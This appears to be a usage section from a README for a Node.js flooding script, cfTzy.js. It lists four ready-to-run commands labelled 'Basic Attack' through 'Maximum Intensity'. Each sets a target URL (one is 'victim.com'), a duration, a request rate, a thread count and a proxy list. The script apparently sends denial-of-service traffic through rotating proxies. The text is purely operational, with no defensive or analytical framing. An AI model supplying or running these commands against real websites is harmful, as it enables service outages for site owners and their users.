###Basic Attack (60 seconds, 10 req/sec, 4 threads)

```node cfTzy.js https://example.com 60 10 4 proxies.txt```

###High Rate Attack (120 seconds, 50 req/sec, 8 threads)

```node cfTzy.js https://target-site.com 120 50 8 proxies.txt```

###Maximum Intensity (300 seconds, 100 req/sec, 16 threads)

```node cfTzy.js https://victim.com 300 100 16 proxies.txt```

###Short Burst (30 seconds, 25 req/sec, 2 threads)

```node cfTzy.js https://test-site.com 30 25 2 proxies.txt```
